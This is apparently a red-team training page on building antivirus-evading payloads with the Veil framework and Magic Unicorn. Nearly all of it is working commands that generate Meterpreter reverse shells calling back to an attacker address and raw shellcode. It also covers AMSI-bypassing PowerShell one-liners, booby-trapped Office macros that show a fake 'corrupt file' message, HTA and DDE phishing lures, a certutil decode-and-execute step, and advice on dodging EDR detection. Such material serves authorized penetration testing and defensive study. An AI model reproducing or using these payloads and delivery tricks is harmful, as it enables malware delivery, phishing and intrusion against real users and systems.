---
layout: training-page
title: "Veil Framework & Magic Unicorn — AV-Evading Payload Generation — Red Team Academy"
module: "Evasion"
tags:
  - veil
  - magic-unicorn
  - av-evasion
  - powershell
  - shellcode-injection
  - payload-generation
  - meterpreter
  - macro
  - hta
page_key: "evasion-veil"
render_with_liquid: false
---

# Veil Framework & Magic Unicorn — AV-Evading Payload Generation

**Veil** is a framework that generates Metasploit-compatible payloads in multiple languages (Go, Python, PowerShell, C) that bypass common AV solutions by avoiding the raw shellcode patterns that signature scanners target. **Magic Unicorn** (by TrustedSec) generates obfuscated PowerShell injection attacks that load shellcode directly into memory without writing a file to disk — avoiding on-disk AV scanning entirely. Both tools are for use on authorized engagements where payload evasion is within scope.

## Veil — Install

```
# Kali Linux (recommended — pre-configured Wine environment):
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent

# From source (Debian/Ubuntu):
git clone https://github.com/Veil-Framework/Veil.git
cd Veil/
./config/setup.sh --force --silent

# The setup script installs:
# - Wine (for Windows compilation of Python/Go payloads)
# - Go, Python, Ruby, AutoIT (Windows via Wine)
# - All dependencies for all payload languages

# Launch interactive menu:
./Veil.py
# OR from anywhere on Kali:
veil
```

## Veil — How It Works

```
# Veil has two tools:
# 1. Veil-Evasion   — generates AV-bypassing executables and scripts
# 2. Veil-Ordnance  — generates raw shellcode (works without Metasploit)

# Veil-Evasion payload categories:
# - go/meterpreter/   — Meterpreter payloads compiled as Go binaries
# - python/meterpreter/ — Python-based payloads (compiled with pyinstaller or py2exe)
# - powershell/       — PowerShell-based payloads
# - cs/               — C# payloads
# - autoit/           — AutoIT-based payloads

# Why Go payloads evade AV better:
# Go binaries compile to a unique binary structure per build
# The runtime library is different from typical PE patterns
# Go does not use the CRT (C runtime) that AV looks for in malware
# Each compiled binary is unique — no shared shellcode stubs

# List all available payloads:
./Veil.py -t Evasion --list-payloads
```

## Veil-Evasion — Generate a Payload

```
# Interactive mode — select payload from menu:
./Veil.py
Veil> use Evasion
Veil/Evasion> list
# See numbered list of payloads
Veil/Evasion> use go/meterpreter/rev_tcp
[go/meterpreter/rev_tcp>>]: set LHOST 10.10.14.5
[go/meterpreter/rev_tcp>>]: set LPORT 443
[go/meterpreter/rev_tcp>>]: generate
# Output: /var/lib/veil/output/compiled/payload.exe

# Non-interactive CLI (automation-friendly):
./Veil.py -t Evasion -p go/meterpreter/rev_tcp \
  --ip 10.10.14.5 --port 443 \
  -o payload_name

# Outputs:
# /var/lib/veil/output/compiled/payload_name.exe   (compiled binary)
# /var/lib/veil/output/source/payload_name.go      (source code)
# /var/lib/veil/output/handlers/payload_name.rc    (Metasploit listener script)

# Auto-start Metasploit listener from the generated .rc file:
msfconsole -r /var/lib/veil/output/handlers/payload_name.rc
```

## Veil-Evasion — Payload Types

```
# Go payloads (lowest detection rate — recommended):
./Veil.py -t Evasion -p go/meterpreter/rev_tcp --ip 10.10.14.5 --port 443
./Veil.py -t Evasion -p go/meterpreter/rev_https --ip 10.10.14.5 --port 443

# PowerShell payloads (fileless — reflective injection):
./Veil.py -t Evasion -p powershell/meterpreter/rev_tcp --ip 10.10.14.5 --port 4444
# Output is a .bat file that runs PowerShell inline — no .exe written to disk

# Python payloads (compile with py2exe for .exe output):
./Veil.py -t Evasion -p python/meterpreter/rev_https --ip 10.10.14.5 --port 443 \
  --compiler py2exe

# Use custom msfvenom shellcode (--msfvenom flag):
./Veil.py -t Evasion -p go/shellcode_inject/virtual \
  --msfvenom windows/x64/meterpreter/reverse_https \
  --ip 10.10.14.5 --port 443
```

## Veil-Ordnance — Raw Shellcode Generation

```
# Generate raw shellcode without needing Metasploit running:
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 10.10.14.5 --port 4444
# Output: \xfc\xe8\x86\x00\x00... (raw shellcode bytes)

# With encoding (removes bad characters / reduces detection):
./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 10.10.14.5 --port 4444 \
  -e xor --bad-chars "\x00\x0a\x0d"

# List available encoders:
./Veil.py -t Ordnance --list-encoders

# Generate bind shell shellcode:
./Veil.py -t Ordnance --ordnance-payload bind_tcp --port 4444
```

## Magic Unicorn — PowerShell Downgrade Injection

Magic Unicorn generates a one-liner PowerShell command that uses PowerShell version 2 downgrade to bypass AMSI and script block logging, then reflectively injects Meterpreter shellcode directly into memory. No files are written to disk. The output is a pasteable command and a ready Metasploit .rc file.

### Install

```
git clone https://github.com/trustedsec/unicorn
cd unicorn
python unicorn.py --help
```

### Basic PowerShell Attack

```
# Generate PowerShell injection payload (uses Metasploit module):
python unicorn.py windows/meterpreter/reverse_https 10.10.14.5 443

# Output files:
# powershell_attack.txt  — the obfuscated PS one-liner command
# unicorn.rc             — Metasploit listener resource script

# Start the Metasploit listener:
msfconsole -r unicorn.rc

# Deliver the payload — paste powershell_attack.txt into:
# - A command prompt on the target
# - A Word/Excel macro (see macro mode below)
# - An HTA file (see hta mode below)
# - A phishing email "run this to fix your VPN"
# - Via SQLi, command injection, or other RCE
# - Via an O.MG cable payload (STRINGLN + content of powershell_attack.txt)
```

### Macro Attack (Word / Excel)

```
# Generate a VBA macro payload:
python unicorn.py windows/meterpreter/reverse_https 10.10.14.5 443 macro

# Output: powershell_attack.txt (VBA macro code)

# Deploy in Word/Excel:
# 1. File → Options → Customize Ribbon → enable Developer tab
# 2. Developer → Visual Basic → Insert Module
# 3. Paste the macro code
# 4. Rename Sub to AutoOpen() (for newer Office 365/2016+)
#    (legacy: Auto_Open — unicorn outputs Sub Auto_Open() by default)
# 5. Save as .docm or .xlsm

# The macro displays a fake "corrupt file" message, then injects shellcode
# File appears to fail — user sees "document corrupted" — shell fires silently

# To use with custom shellcode from Cobalt Strike:
python unicorn.py cobalt_strike_shellcode.cs cs macro
```

### HTA Attack

```
# Generate an HTML Application (HTA) payload:
python unicorn.py windows/meterpreter/reverse_https 10.10.14.5 443 hta

# Output directory: hta_access/
# Files: index.html, Launcher.hta, unicorn.rc

# Host the hta_access/ directory on your web server:
cd hta_access/
python3 -m http.server 80

# Send victim a link to http://10.10.14.5/
# Browser opens index.html → redirects to Launcher.hta
# Windows prompts: "Run ActiveX control?" → user clicks Allow
# HTA executes → PowerShell injection → shell

# HTA delivery via email:
# Attach Launcher.hta directly — "Click to view secure document"
# Or use HTML smuggling to deliver (bypasses email attachment scanners)
```

### DDE (Dynamic Data Exchange) Attack

```
# Word/Excel DDE attack (no macros needed — uses DDE feature):
python unicorn.py windows/meterpreter/reverse_https 10.10.14.5 443 dde

# Output: powershell_attack.txt (DDE formula to paste into cell/field)

# Deploy:
# In Excel: paste the DDE formula into a cell
# In Word: Insert → Quick Parts → Field → = (formula) → paste DDE content
# When victim opens file → prompt to update links → click Yes → shell fires

# DDE was largely patched in Office 2016+ with security updates
# Still works on unpatched systems
```

### CertUtil Binary Transfer

```
# Transfer a binary to a target using certutil (LOLBin):
# Convert payload.exe to base64 cert format:
python unicorn.py payload.exe crt

# Output: decode_attack/ directory containing:
# - payload.exe.bat   (runs certutil to decode and execute)
# - payload.b64       (the base64-encoded binary)

# On target — run the .bat file (or type commands manually):
certutil -decode payload.b64 payload.exe
payload.exe

# Why certutil works:
# certutil.exe is a signed Microsoft binary (LOLBAS)
# It's trusted by most AV
# Converts base64-encoded "certificate" files to binary
# Decodes and writes the exe — then you execute it separately
```

## OPSEC & Detection

```
# Veil Go payload detection signals:
# - Unusual PE compilation (Go runtime in binary)
# - Network connection on port 443 from a Go binary (unusual user-agent)
# - Metasploit handler certificate fingerprinting by EDR

# Magic Unicorn detection signals:
# - powershell.exe -Version 2 (downgrade attack) — logged even if AMSI blocked
# - Very long encoded command (-enc flag with base64 string >500 chars)
# - Process: powershell.exe creating a memory-only thread (VirtualAlloc + CreateThread)
# - Script block logging: IEX + large compressed/encoded string

# OPSEC improvements:
# 1. Use HTTPS payloads over port 443 (443 is most commonly allowed egress)
# 2. Set up a redirector (Apache/nginx) in front of Metasploit handler
# 3. Use Veil Go payload over Magic Unicorn if host has Script Block Logging
# 4. Test payload against common AV in a lab before deployment
# 5. For Unicorn: wrap output in additional obfuscation (Invoke-Obfuscation)
# 6. Combine with process hollowing for better EDR evasion (see process injection page)
```

## Resources

- Veil Framework — `github.com/Veil-Framework/Veil`
- Magic Unicorn (TrustedSec) — `github.com/trustedsec/unicorn`
- Related: [AV / EDR Evasion](/evasion/av-edr-evasion/)
- Related: [AMSI Bypass](/evasion/amsi-bypass/)
- Related: [Process Injection & DLL Hijacking](/exploitation/process-injection/)
- Related: [ShadowPhish — Word Macro Delivery](/web/shadowphish/)
